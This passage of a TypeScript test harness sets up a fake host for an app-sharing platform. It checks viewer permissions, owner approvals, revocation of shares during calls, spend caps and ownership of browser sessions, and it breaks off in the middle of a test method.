/**
 * A real SlateHost in workerd, reached through `routeShare` over Cap'n Web (batch and socket arms).
 * Also bound as `OrchestratorAgent` because the slate's `workspace` resolves `workspaceOwner(...).slateCallAs` by `ctx.id.name`.
 */
import { Effect } from 'effect';
import { DurableObject, WorkerEntrypoint } from 'cloudflare:workers';
import * as v from 'valibot';
import { newWebSocketRpcSession } from 'capnweb';
import { SqliteVFS } from '@nimbus-sh/core/vfs/sqlite-vfs.js';
import { ProcessFiles } from '@nimbus-sh/core/runtime/process-files.js';
import { supervisorEsbuildService } from '@nimbus-sh/worker/facet-host';
import { CRED_KERNEL, CRED_SESSION_USER } from '@nimbus-sh/core/runtime/os-contracts.js';
import { seedBaseFilesystem } from '@nimbus-sh/core/workspace';
import { SessionProcessSupervisor } from '@nimbus-sh/core/runtime/session-process-supervisor.js';
import { PID_GEN_STRIDE } from '@nimbus-sh/core/runtime/process-table.js';
import { PortRegistry } from '@nimbus-sh/core/runtime/port-registry.js';
import { probeDurableApps, probeFacetManager } from './facet-manager';
import {
  agentCred, approvalKindOf, bearWorkspaceIdentity, bindActorHandle, DeferredApprovalQueue, DeferredApprovalStore, initWorkspaceSchema, openWorkspaceMainActor, WORKSPACE_IDENTITY_DDL,
  type ActorHandle, MissionGovernor, provisionAgentHome, settleWorkspaceSlates, SHARE_SPEND_CAP_USD_PER_DAY, SlateOperationSchema,
  shareSpendLabel, type JsonValue, type ShareViewerClaim, type SlateCallResult, type SlateSurfaceResult, type SqlExec, type SqlExecutor, type SqlValue, actorHomeName } from '@kinu.run/core';
import { SlateId } from '@agent-core/core/slates';
import { initSlateLiveShareTables, slateDirectory } from '@kinu.run/core/slates';
import { SlateHost } from '../../src/slates/host';
import { initSlateBuildTable, SlateBuilds } from '@kinu.run/core/slates';
import { ROOT_SLATE_CALLER, slateRevision, type PartRunAnswer, type PartRunRequest, type SlateCaller, type SlateConsent } from '@kinu.run/core/slates';
import type { PartViewer } from '../../src/slates/part-runs';
import { FakeViewerAccounts } from './personal-parts-fakes';
import { slateBatchStub } from '../../src/slates/rpc-transport';
import { renderThrownChain } from '@kinu.run/core/obs';
import { asFetchFunction, callCodemodeMember, createDefaultWebSearchProvider, createWebCodemodeProvider, requireCodemodeMember } from '@kinu.run/core';

// `env.FILES` and `codemodeEgress()` resolve exports of this worker; without them a `build` boot throws before the route.


export * from '../../src/server';

/** The owner's connections as a graph reads them: one MCP server with a read-only tool and one that writes. */
const MCP = [{ server: 'github', title: 'github', tools: [{ name: 'read_issue', readOnly: true }, { name: 'create_issue', readOnly: false }] }];

/** The triage slates, and what each calls as its owner runs it: `issues` hops into `triage-digest`, which hops back. */
const TRIAGE = {
  issues: [
    ['mcp', 'github', 'read_issue'], ['mcp', 'github', 'create_issue'], ['readFile'], ['writeFile'],
    ['memory', 'recall'], ['memory', 'remember'], ['agent', 'send'], ['slates', 'triage-digest', 'summary'],
  ],
  'triage-digest': [['readFile'], ['slates', 'issues', 'refresh']],
  // What a slate never reaches: control of its calling agent, or making tools; and helpers, the owner's own slate's alone.
  overreach: [['agents', 'hire'], ['agent', 'hire'], ['workspace', 'createTool']],
} as const;

const refusedText = async (call: Promise<JsonValue>): Promise<string> => {
  try {
    await call;

    return 'mutate answered';
  } catch (cause) {
    return renderThrownChain({ cause });
  }
};

const SLATE_ID = 'board';

/** The actor whose browser sessions the owner's slate drives, and the one session it opened. */
const PROBE_ACTOR = 'probe-actor';

const OWNED_SESSION = 'owned-session';

/** A slate whose class connects the browser session its request names, as an eval program would. */
const DRIVER = [
  'import { SlateObject } from "kinu:slate";',
  'export class Slate extends SlateObject {',
  '  async fetch(request) {',
  '    const session = new URL(request.url).searchParams.get("session");',
  '    try { await this.env.workspace.web.connectBrowser(session); return new Response("connected"); }',
  '    catch (cause) { return new Response(String(cause?.message ?? cause)); }',
  '  }',
  '}',
].join('\n');

/**
 * A class that reads `ai.stream`, or the reply `agent.ask` answers, as its page would, a piece at a time, and answers
 * what it read and in how many pieces.
 */
const TYPIST = [
  'import { SlateObject } from "kinu:slate";',
  'export class Slate extends SlateObject {',
  '  async fetch(request) {',
  '    const url = new URL(request.url);',
  '    const say = url.searchParams.get("say");',
  '    const stream = url.searchParams.get("via") === "ask" ? (await this.env.workspace.agent.ask({ text: say })).reply : await this.env.workspace.ai.stream({ prompt: say });',
  '    const pieces = [];',
  '    for await (const piece of stream) {',
  '      pieces.push(piece);',
  '      await this.env.workspace.writeFile("/typed", pieces.join(""));',
  '    }',
  '    return Response.json(pieces);',
  '  }',
  '}',
].join('\n');

/**
 * UTF-8 bytes, a piece at a time, as a model writes them. The last waits until its reader has said it holds text
 * already, so the stream ends only if what came before it reached the reader first.
 */
function typedPieces(pieces: readonly string[], read: Promise<void>): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder();
  const left = [...pieces];

  return new ReadableStream({
    async pull(controller) {
      const piece = left.shift();

      if (piece === undefined) {
        controller.close();

        return;
      }

      if (left.length === 0) await read;
      controller.enqueue(encoder.encode(piece));
    },
  });
}

/** Each time this isolate's Browser Run was dialed: a browser the class reached, whatever the dial then answered. */
let browserRunDials = 0;

/** Browser Run, as the egress gate reaches it: a session answers where a CDP socket would, naming the session. */
export class FakeBrowserRun extends WorkerEntrypoint {
  override async fetch(): Promise<Response> {
    browserRunDials += 1;

    return new Response('Browser Run started a Kitesurf browser');
  }

  async connectSession(sessionId: string) {
    browserRunDials += 1;

    return { webSocket: { fetch: async () => new Response(`Browser Run reached session ${sessionId}`) } };
  }
}

/** The web members a slate's host answers; with no Browser Run of its own, only the browser members' refusals. */
const PROBE_WEB = createWebCodemodeProvider({
  provider: createDefaultWebSearchProvider({ fetch: asFetchFunction(async () => new Response('', { status: 404 })), browser: { missing: 'the probe renders nothing' } }),
  files: null, prelude: { missing: 'a slate drives a browser from its class' },
});

export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
  private readonly vfs = new SqliteVFS(this.ctx.storage.sql, this.ctx);
  private readonly filesystem = new ProcessFiles(this.vfs);
  private readonly processes = new SessionProcessSupervisor();

  /** How many processes the owner's own calls left running before the board was shared. */
  private ownersOwn = 0;
  private readonly ports = new PortRegistry();
  private readonly host: SlateHost;
  private _budget: MissionGovernor | undefined;
  private readonly sql: SqlExecutor;
  private lastCall: string | null = null;
  private readonly deferrals: DeferredApprovalQueue;
  /** Each live share whose listing the Gallery was told, in order, since this object started. */
  private readonly galleryTold: string[] = [];
  /** The writes a viewer's call made, past its admission. */
  #writes = 0;
  /** A write held between its preparation and its send, while a test changes its share. */
  #heldWrite: { readonly reached: { resolve: () => void }; readonly release: { readonly promise: Promise<void> } } | null = null;
  /** Each viewer's own account, as their parts reach it. */
  private readonly accounts = new FakeViewerAccounts();
  /** The notes slate's share (`startParts`). */
  private notesShare = '';
  /** Holds a launch where it asks for the owner's browser, until let go (`launchAcrossShare`). */
  private actorGate: { readonly gate: Promise<undefined>; readonly reached: (value: undefined) => void } | null = null;
  /** How many launches asked for the owner's browser. */
  private actorCalls = 0;
  /** The run the last part call named, as its process's binding sent it. */
  private lastPartRun: string | null = null;

  constructor(ctx: DurableObjectState, env: Cloudflare.Env) {
    super(ctx, env);
    // The tagged-template bridge mirrors `bindAgentSql` (src/runtime.ts), hosted where the Agents SDK is not.

    const sql: SqlExecutor = <Row,>(
      query: TemplateStringsArray, ...values: SqlValue[]
    ): Row[] => ctx.storage.sql.exec<Row & Record<string, SqlStorageValue>>(query.join('?'), ...values).toArray();

    const exec: SqlExec = {
      exec: (query, ...bindings) => ctx.storage.sql.exec(query, ...bindings),
    };

    this.sql = sql;

    initWorkspaceSchema({
      execRaw: (ddl: string) => ctx.storage.sql.exec(ddl), sql, exec, transactionSync: (write) => ctx.storage.transactionSync(write),
    });
    // The owner's one queue of parked actions, as the orchestrator's: an `owner` share's acting calls wait in it.
    this.deferrals = new DeferredApprovalQueue({
      store: new DeferredApprovalStore(sql, this.mainAgent()), writes: null, remember: () => undefined, wake: () => Effect.void,
    });
    initSlateLiveShareTables((ddl: string) => ctx.storage.sql.exec(ddl));
    initSlateBuildTable((ddl: string) => ctx.storage.sql.exec(ddl));
    seedBaseFilesystem(this.vfs);
    // As the Kinu boot leaves every workspace: slates are the workspace's, not its main agent's.
    settleWorkspaceSlates(this.vfs.as(CRED_KERNEL), (path) => { this.vfs.registerSharedDirectory(path); });
    // Pids are generation-scoped per boot so a re-spawned process never gets a pid with a live append writer. The
    // probe hosts no Kinu workspace, so it keeps its own counter, one atomic statement per construction.
    ctx.storage.sql.exec('CREATE TABLE IF NOT EXISTS probe_generation (id INTEGER PRIMARY KEY, value INTEGER NOT NULL)');

    const generation = ctx.storage.sql.exec<{ value: number }>(
      'INSERT INTO probe_generation (id, value) VALUES (1, 1) ON CONFLICT(id) DO UPDATE SET value = value + 1 RETURNING value',
    ).one().value;

    this.processes.setPidBase(generation * PID_GEN_STRIDE);
    const facets = probeFacetManager({ ctx, env, processes: this.processes, portRegistry: this.ports, vfs: this.vfs, filesystem: this.filesystem });

    this.host = new SlateHost({
      ctx, workspace: ctx.id.name ?? ctx.id.toString(), builds: new SlateBuilds(ctx.storage.sql),
      session: async () => ({ vfs: this.vfs, processes: this.processes, filesystem: this.filesystem }),
      facetManager: async () => facets,
      bundler: (vfs) => supervisorEsbuildService(ctx, env, vfs),
      dispatch: async (_caller, route, context) => {
        // The actor's half of `ai.stream`: the model's text, a piece at a time, as the actor hands it over.
        if (route.kind === 'ai' && route.stream === true) return typedPieces(['Typ', 'ing ', route.prompt], this.#typing.promise);

        // And of `agent.ask`: the reply of the turn the message lands in, as the actor answers it at once.
        if (route.kind === 'agent' && route.ask === true) return { reply: typedPieces(['The ', 'agent ', 'says ', route.text], this.#typing.promise) };

        // The typist's word that it has text already: the model's last piece waits on it.
        if (route.kind === 'namespace' && route.member === 'writeFile' && route.args[0] === '/typed') {
          this.#typing.resolve();

          return null;
        }

        if (route.kind !== 'namespace') throw new Error(`probe dispatch answers namespace only, got ${route.kind}`);

        // The actor's half of authorizing a browser member: it is within reach, so the class may run it.
        if (route.namespace === 'web' && context.authorizeOnly) {
          requireCodemodeMember([PROBE_WEB], 'web', route.member);
          context.admit?.();

          return null;
        }

        // A write a test holds where its dispatch prepares it, before the send, as an MCP call's credentials are read.
        const hold = route.member === 'writeFile' ? this.#heldWrite : null;

        if (hold !== null) {
          hold.reached.resolve();
          await hold.release.promise;
        }

        // As the actor does: a viewer's call is admitted immediately before it acts.
        context.admit?.();

        if (route.namespace === 'web') return await callCodemodeMember([PROBE_WEB], 'web', route.member, route.args) ?? null;

        if (route.member === 'readFile') {
          const path = v.is(v.string(), route.args[0]) ? route.args[0] : '/x';

          return this.vfs.as(CRED_KERNEL).readFileString(path);
        }

        if (route.member === 'writeFile') this.#writes += 1;

        return null;
      },
      apps: {
        ...probeDurableApps(facets),
        url: async (port) => ({ url: `https://${String(port)}.preview.test/` }),
      },
      browserActor: async (caller) => {
        this.actorCalls += 1;
        const held = this.actorGate;

        if (held !== null) {
          held.reached(undefined);
          await held.gate;
        }

        return caller.share === undefined ? PROBE_ACTOR : null;
      },
      catalog: async () => ({ mcp: MCP, slates: Object.keys(await this.host.controller.projects(ROOT_SLATE_CALLER)) }),
      shareEntry: (share) => `https://app.test/shared/live/probe/${share}`,
      // No AUTH_KV binding, as on a deployment without it; the spend bound is real.
      budget: () => this.governor(),
      ownerTitle: async () => ctx.id.name ?? ctx.id.toString(),
      ownerUserId: () => 'u-owner',
      partConnections: this.accounts,
      ownerEffects: {
        ask: (id, effect) => this.deferrals.slateEffect(id, effect),
        take: (id) => this.deferrals.takeSlateEffect(id),
        settle: (spend, outcome) => this.deferrals.settle(spend, outcome),
        retire: (share) => { this.deferrals.retireSlateEffects(share); },
      },
      listingChanged: async (share) => { this.galleryTold.push(share.id); },
      relisted: (shares) => { this.galleryTold.push(...shares.map((share) => share.id)); },
    });
  }

  /** The workspace's main agent as its directory holds it, born with the probe's identity: whose rows the owner's
   *  queue lists. */
  private mainAgent(): ActorHandle {
    this.ctx.storage.sql.exec(WORKSPACE_IDENTITY_DDL);
    const born = this.sql<{ id: string }>`SELECT id FROM workspace_identity LIMIT 1`.length > 0;

    return born ? openWorkspaceMainActor(this.sql) : bearWorkspaceIdentity(this.sql, { name: this.ctx.id.name ?? 'probe', createdAt: Date.now() });
  }

  private governor(): MissionGovernor {
    this._budget ??= new MissionGovernor({
      storage: { sql: this.sql, execRaw: (ddl: string) => this.ctx.storage.sql.exec(ddl) },
      actor: bindActorHandle(this.sql, {
        actorId: 'main', workspaceId: this.ctx.id.name ?? this.ctx.id.toString(),
        parentActorId: null, name: 'main', storageKey: 'main',
      }, () => Effect.void),
    });

    return this._budget;
  }

  async start(): Promise<void> {
    const root = '/slates/board';
    const files = this.vfs.as(CRED_KERNEL);
    files.mkdir(root, { recursive: true });
    files.writeFile(`${root}/package.json`, JSON.stringify({
      name: SLATE_ID, main: 'server.ts',
      slate: { title: 'Board', runtime: 'worker' },
    }));
    files.writeFile(`${root}/server.ts`, [
      'import { SlateObject } from "kinu:slate";',
      'export class Slate extends SlateObject {',
      '  async probe() { return await this.env.workspace.readFile("/x"); }',
      '  async mutate() { return await this.env.workspace.writeFile("/x", "y"); }',
      '  async hop() { return await this.env.workspace.slates.digest.digest(); }',
      // Straight to its binding, naming no request: the runner's wrapper is the slate's own code, never a boundary.
      '  async raw() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["writeFile"], ["/x", "raw"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
      '  async fetch() { return new Response("share-ok"); }',
      '}',
    ].join('\n'));
    const digest = '/slates/digest';
    files.mkdir(digest, { recursive: true });
    files.writeFile(`${digest}/package.json`, JSON.stringify({
      name: 'digest', main: 'server.ts', slate: { title: 'Digest', runtime: 'worker' },
    }));
    files.writeFile(`${digest}/server.ts`, [
      'import { SlateObject } from "kinu:slate";',
      'export class Slate extends SlateObject {',
      '  async digest() { return "digest-ok"; }',
      '}',
    ].join('\n'));
    files.writeFile('/x', 'fixture-bytes');
  }

  /**
   * A hired agent's slate, made with its own credential where slates live: its manifest in place, its server built
   * in its home and moved in, as a hire promotes a draft. The main agent changes both, then the hire previews it
   * and, as the main agent would, removes it.
   */
  async previewAsHire(): Promise<{ preview: SlateCallResult; removed: SlateCallResult; left: boolean }> {
    const identity = { uid: 2001, gid: 2001 };
    const home = provisionAgentHome(this.vfs.as(CRED_KERNEL), actorHomeName({ origin: 'agent', name: 'builder', storageKey: 'builder' }), identity);
    const hire: SlateCaller = { path: [{ name: 'builder' }], cred: agentCred(identity), workMode: 'build' };
    const dir = slateDirectory(new SlateId('widgets'));
    const files = this.vfs.as(hire.cred);
    const main = this.vfs.as(CRED_SESSION_USER);
    const manifest = (title: string) => JSON.stringify({ name: 'widgets', main: 'server.ts', slate: { title, runtime: 'worker' } });

    const server = (count: number) => [
      'import { SlateObject } from "kinu:slate";',
      'export class Slate extends SlateObject {',
      `  async count() { return ${String(count)}; }`,
      '}',
    ].join('\n');

    files.mkdir(dir, { recursive: true });
    files.writeFile(`${dir}/package.json`, manifest('Widgets'));
    files.writeFile(`${home}/server.ts`, server(3));
    files.rename(`${home}/server.ts`, `${dir}/server.ts`);
    main.writeFile(`${dir}/package.json`, manifest('Widgets, reviewed'));
    main.writeFile(`${dir}/server.ts`, server(4));
    const preview = await this.host.controller.operation(hire, { op: 'preview', id: 'widgets' });
    const removed = await this.host.controller.operation(hire, { op: 'remove', id: 'widgets' });

    return { preview, removed, left: this.vfs.as(CRED_KERNEL).exists(dir) };
  }

  /** The egress gate's question of the workspace object: whether this actor opened this session. */
  async ownsBrowserSession(actorId: string, sessionId: string): Promise<boolean> {
    return actorId === PROBE_ACTOR && sessionId === OWNED_SESSION;
  }

  /** Settled once the typist has written down text it read: its stream's last piece waits on it. */
  #typing = Promise.withResolvers<void>();

  /** What the typist slate's class read from `ai.stream`, or `agent.ask`'s reply, through the runner and the binding. */
  async typed(say: string, via: 'stream' | 'ask' = 'stream'): Promise<string> {
    this.#typing = Promise.withResolvers<void>();
    const files = this.vfs.as(CRED_KERNEL);
    files.mkdir('/slates/typist', { recursive: true });
    files.writeFile('/slates/typist/package.json', JSON.stringify({ main: 'server.js' }));
    files.writeFile('/slates/typist/server.js', TYPIST);
    const process = await this.host.ensure(ROOT_SLATE_CALLER, 'typist');

    return await (await process.request(new Request(`https://slate.invalid/?say=${encodeURIComponent(say)}&via=${via}`))).text();
  }

  /** What the owner's driver slate answers when its class connects `session`. */
  async drive(session: string): Promise<string> {
    const files = this.vfs.as(CRED_KERNEL);
    files.mkdir('/slates/driver', { recursive: true });
    files.writeFile('/slates/driver/package.json', JSON.stringify({ name: 'driver', main: 'server.js' }));
    files.writeFile('/slates/driver/server.js', DRIVER);
    const process = await this.host.ensure(ROOT_SLATE_CALLER, 'driver');

    return await (await process.request(new Request(`https://slate.invalid/?session=${encodeURIComponent(session)}`))).text();
  }

  /**
   * What the driver answers a viewer of its public share when its class connects `session`, the owner having run it
   * once and shared it granting `approved` beyond what observes.
   */
  async driveShared(session: string, approved: readonly string[], claim: ShareViewerClaim): Promise<{ answer: string; dialed: number }> {
    await this.drive('kitesurf');
    const before = browserRunDials;

    const created = v.parse(v.object({ ok: v.literal(true), value: v.object({ share: v.object({ id: v.string(), handle: v.string() }) }) }), await this.host.controller.operation(ROOT_SLATE_CALLER, {
      op: 'share', id: 'driver', visibility: 'public', approved: approved.map((member) => ({ slate: 'driver', namespace: 'web', member })),
    }));

    // The owner's approved reach, on "my access", at the revision the driver runs.
    await this.ownerMode(created.value.share.id, 'driver', approved.map((member) => ({ slate: 'driver', namespace: 'web', member })));
    const visit = async () => (await this.host.routeShare(created.value.share.handle, claim, new Request(`https://share.invalid/?session=${encodeURIComponent(session)}`), '/')).text();
    const asked = await visit();

    // A connect acts with the owner's access, so it waits for them; on their word it runs, once.
    const answer = await this.ownerDecides(true) > 0 ? await visit() : asked;

    return { answer, dialed: browserRunDials - before };
  }

  /** The triage slates (`TRIAGE`), as an owner authors them where slates live and runs each through what it calls. */
  async authorTriage(): Promise<void> {
    const files = this.vfs.as(CRED_KERNEL);

    for (const id of Object.keys(TRIAGE)) {
      files.mkdir(`/slates/${id}`, { recursive: true });
      files.writeFile(`/slates/${id}/package.json`, JSON.stringify({ name: id, main: 'server.ts', slate: { title: id, runtime: 'worker' } }));
      files.writeFile(`/slates/${id}/server.ts`, 'import { SlateObject } from "kinu:slate";\nexport class Slate extends SlateObject {}\n');
    }

    // Each call is recorded where the host routes it, whatever it then answers.
    for (const [id, paths] of Object.entries(TRIAGE)) {
      for (const path of paths) await this.host.surfaceCall(ROOT_SLATE_CALLER, id, 'workspace', { path: [...path], args: path[0] === 'mcp' || path[0] === 'agent' ? [{ text: 'x' }] : [], invocation: null });
    }
  }

  /** One operation as `as` asks it: the owner at the root, the owner in Plan mode, or a hired agent. */
  async operationAs(as: 'root' | 'plan' | 'hire', input: JsonValue): Promise<SlateCallResult> {
    const callers: Record<typeof as, SlateCaller> = {
      root: ROOT_SLATE_CALLER, plan: { ...ROOT_SLATE_CALLER, workMode: 'plan' }, hire: { ...ROOT_SLATE_CALLER, path: [{ name: 'helper' }] },
    };

    return this.host.controller.operation(callers[as], v.parse(SlateOperationSchema, input));
  }

  /** A call a share's viewer makes with no invocation: the share must name the running call it rides. */
  async unnamedShareCall(share: string): Promise<SlateSurfaceResult> {
    return this.host.surfaceCall({ ...ROOT_SLATE_CALLER, share }, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: null });
  }

  /** The board as its owner runs it, so its graph names what a share can grant. */
  private async exerciseBoard(): Promise<void> {
    for (const [path, args] of [[['readFile'], ['/x']], [['writeFile'], ['/x', 'fixture-bytes']], [['slates', 'digest', 'digest'], []]] as const) {
      await this.host.surfaceCall(ROOT_SLATE_CALLER, SLATE_ID, 'workspace', { path: [...path], args: [...args], invocation: null });
    }
  }

  /**
   * `approved` names members granted beyond the graph's observing members. On "my access" (`owner`, as every base share
   * acted) the owner approves that grant at the revision the board runs; on each viewer's own access it grants nothing.
   */
  async share(approved: readonly { namespace: string; member: string }[] = [], mode: 'own' | 'owner' = 'owner'): Promise<SlateCallResult> {
    await this.exerciseBoard();
    // Built, so there is a revision for the owner to approve the reach at.
    await this.host.ensure(ROOT_SLATE_CALLER, SLATE_ID);

    const shared = await this.host.controller.operation(ROOT_SLATE_CALLER, {
      op: 'share', id: SLATE_ID, visibility: 'public', approved: approved.map((granted) => ({ slate: SLATE_ID, ...granted })),
    });

    const created = v.safeParse(v.object({ ok: v.literal(true), value: v.object({ share: v.object({ id: v.string() }) }) }), shared);

    if (mode === 'owner' && created.success) await this.ownerMode(created.output.value.share.id, SLATE_ID, approved.map((granted) => ({ slate: SLATE_ID, ...granted })));

    // What the owner's own use left running once the share stopped the board's app: a share's own calls start it again.
    this.ownersOwn = this.processes.getRunning().length;

    return shared;
  }

  /** Its owner turns `share` to "my access" over the reach the slate's graph answers now, as their share sheet does. */
  private async ownerMode(share: string, slate: string, approved: readonly { slate: string; namespace: string; member: string }[]): Promise<void> {
    const reach = v.parse(v.object({ ok: v.literal(true), value: v.object({ revision: v.string() }) }),
      await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'graph', id: slate }));

    const set = await this.setMode(share, reach.value.revision, approved);

    if (!set.ok) throw new Error(`owner mode refused: ${set.error}`);
  }

  /** The owner's word on a share's mode, at the revision they reviewed the reach at. */
  setMode(share: string, revision: string, approved: readonly { slate: string; namespace: string; member: string }[] = []) {
    return this.host.controller.setLiveShareMode({ workspace: this.ctx.id.name ?? this.ctx.id.toString(), share, mode: 'owner', revision, approved: [...approved] });
  }

  /** What `owner` shares' calls asked of the owner and still wait on them, as their decision stack lists it. */
  ownerQueue(): { tool: string; server: string; viewer: string; payload: JsonValue; revision: string }[] {
    return this.deferrals.list().flatMap((action) => {
      const kind = approvalKindOf(action);

      return kind.kind === 'slate-effect' ? [{ tool: kind.effect.tool, server: kind.effect.server, viewer: kind.effect.viewer, payload: kind.effect.payload, revision: kind.effect.revision }] : [];
    });
  }

  /** The owner answers everything their shares asked of them; how many they answered. */
  async ownerDecides(approve: boolean): Promise<number> {
    const asked = this.deferrals.list().filter((action) => approvalKindOf(action).kind === 'slate-effect').map((action) => action.id);

    return asked.length === 0 ? 0 : (await this.deferrals.decide(asked, approve ? 'approved' : 'denied')).length;
  }

  /**
   * A viewer's write held where its dispatch prepares it while its share is revoked, or turned to each viewer's own
   * access, then let go: what the write answered, and whether it was made.
   */
  async heldWrite(handle: string, claim: ShareViewerClaim, share: string, change: 'revoke' | 'own'): Promise<{ mutateError: string; written: boolean }> {
    const hold = { reached: Promise.withResolvers<void>(), release: Promise.withResolvers<void>() };
    const before = this.#writes;

    this.#heldWrite = hold;

    // The write alone: the share's change stops the slate's process under it, which any other call in flight would meet.
    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
    );

    const answered = refusedText(stub.mutate());

    await hold.reached.promise;

    if (change === 'revoke') await this.revoke(share);
    else await this.host.controller.setLiveShareMode({ workspace: this.ctx.id.name ?? this.ctx.id.toString(), share, mode: 'own' });
    this.#heldWrite = null;
    hold.release.resolve();
    const mutateError = await answered;

    stub[Symbol.dispose]();

    return { mutateError, written: this.#writes > before };
  }

  /** Its owner lists `share` in the Gallery, as their share sheet does. */
  listShare(share: string) {
    return this.host.controller.setLiveShareListing({ workspace: this.ctx.id.name ?? this.ctx.id.toString(), share, listed: true, line: 'A board', category: 'work' });
  }

  /** The shares the Gallery was told of since the last ask, or since this object started. */
  told(): string[] {
    return this.galleryTold.splice(0);
  }

  /** The owner edits the board and it builds anew; its revision now. */
  async editBoard(): Promise<string> {
    const path = `/slates/${SLATE_ID}/server.ts`;
    const files = this.vfs.as(CRED_KERNEL);

    files.writeFile(path, `${files.readFileString(path)}\n// edited`);
    this.host.controller.filesChanged([path]);
    await this.host.ensure(ROOT_SLATE_CALLER, SLATE_ID);

    return slateRevision(this.host.controller.builds, SLATE_ID) ?? '';
  }

  /** Publishes the board as a blueprint and imports it back as a fork, as a forker's workspace admits one. */
  async importBlueprint(): Promise<{ fork: string; running: number }> {
    const committed = await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'commit', id: SLATE_ID });

    if (!committed.ok) throw new Error(`${committed.reason}: ${committed.error}`);
    const version = v.parse(v.object({ id: v.string() }), committed.value).id;
    const published = await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'publish', id: SLATE_ID, version, include: [] });

    if (!published.ok) throw new Error(`${published.reason}: ${published.error}`);
    const share = v.parse(v.object({ share: v.object({ id: v.string() }) }), published.value).share.id;
    const bundle = await this.host.controller.blueprintBundle(share);

    if (!bundle.ok) throw new Error(`${bundle.reason}: ${bundle.error}`);
    const fork = await this.host.controller.admitBlueprint(bundle.value);

    if (!fork.ok) throw new Error(`${fork.reason}: ${fork.error}`);

    return { fork: fork.value.slate, running: this.processes.getRunning().length };
  }

  async liveShares(): Promise<SlateCallResult> {
    return this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'liveShares' });
  }

  /** The app hop, over one batch. */
  async viewerHop(handle: string, claim: ShareViewerClaim): Promise<string> {
    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
    );

    try {
      return JSON.stringify(await stub.hop());
    } catch (cause) {
      return renderThrownChain({ cause });
    } finally {
      stub[Symbol.dispose]();
    }
  }

  /**
   * One socket session whose share changes between its calls: revoked, or spent past its daily cap by other
   * viewers' calls. `late` is a call carrying the session's invocation that arrives after the change, as one
   * already in flight from the slate does.
   */
  async viewerSocketAcross(
    handle: string, claim: ShareViewerClaim, share: string, change: 'revoke' | 'spend',
  ): Promise<{ before: string | null; after: string; late: string }> {
    const response = await this.host.routeShare(
      handle, claim, new Request('https://share.invalid/__rpc', { headers: { Upgrade: 'websocket' } }), '/__rpc',
    );

    const socket = response.webSocket;

    if (socket === null) throw new Error(`upgrade refused: ${response.status}`);
    socket.accept();
    const stub = newWebSocketRpcSession<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(socket);

    try {
      const raw = await stub.probe();
      const before = v.is(v.string(), raw) ? raw : JSON.stringify(raw ?? null);

      if (change === 'revoke') {
        await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'unshare', share });
      } else {
        const governor = this.governor();
        governor.declare(shareSpendLabel(share), { usd: SHARE_SPEND_CAP_USD_PER_DAY });
        governor.debit(Math.ceil(SHARE_SPEND_CAP_USD_PER_DAY / 0.003 * 1000) + 1000, { labels: [shareSpendLabel(share)] });
      }

      const late = JSON.stringify(await this.replay(share));

      return { before, after: await refusedText(stub.probe()), late };
    } finally {
      socket.close();
    }
  }

  async viewerFetch(handle: string, claim: ShareViewerClaim): Promise<{ status: number; body: string }> {
    try {
      const response = await this.host.routeShare(handle, claim, new Request('https://share.invalid/'), '/');

      return { status: response.status, body: await response.text() };
    } catch (cause) {
      return { status: 500, body: 'THROWN: ' + renderThrownChain({ cause }) };
    }
  }

  /** The transport ships one batch, so both calls issue in the same tick. */
  /** What a viewer's call of each member is refused with, as the slate's server's refusal reaches them. */
  async viewerRefusals(handle: string, claim: ShareViewerClaim): Promise<{ probe: string; mutate: string }> {
    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
    );

    const [probe, mutate] = await Promise.all([refusedText(stub.probe()), refusedText(stub.mutate())]);

    stub[Symbol.dispose]();

    return { probe, mutate };
  }

  /** One method of the board, called as a viewer of the share `handle`: its answer, or its refusal in its words. */
  async viewerCall(handle: string, claim: ShareViewerClaim, method: string): Promise<string> {
    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
    );

    const answer = await refusedText(stub[method]?.() ?? Promise.resolve(null));

    stub[Symbol.dispose]();

    return answer;
  }

  /**
   * A viewer's request this host admitted and still holds (a socket's), whose slate's last share is then revoked: the
   * call it makes after is answered as the host answers it then.
   */
  async viewerAfterLastRevoke(handle: string, claim: ShareViewerClaim, share: string): Promise<SlateSurfaceResult> {
    const admitted = await this.host.admitViewerRequest({ handle, claim, pathname: '/' });

    if (admitted instanceof Response) throw new Error(`not admitted: ${admitted.status}`);
    this.host.controller.live.revoke(share);

    return await this.host.surfaceCall(ROOT_SLATE_CALLER, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: admitted.invocation });
  }

  /**
   * An unshared launch of the board held where it chooses its network (the owner's browser), shared on each person's
   * own access meanwhile, then let go: whether the server that runs then holds the owner's browser.
   */
  async launchAcrossShare(): Promise<{ actors: number; afterShare: number; refused: string; running: number }> {
    await this.exerciseBoard();
    await this.host.controller.processes.stopWhere((running) => running.id === SLATE_ID);
    // What runs without the board: the race leaves nothing of the board's beside it.
    const without = this.processes.getRunning().length;
    const gate = Promise.withResolvers<undefined>();
    const reached = Promise.withResolvers<undefined>();

    this.actorGate = { gate: gate.promise, reached: reached.resolve };
    this.actorCalls = 0;
    const call = this.host.call({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, method: 'probe', args: [] });

    await reached.promise;
    await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'share', id: SLATE_ID, visibility: 'public', approved: [] });
    const actors = this.actorCalls;

    this.actorGate = null;
    gate.resolve(undefined);
    const answered = await call;

    const running = this.processes.getRunning().length - without;

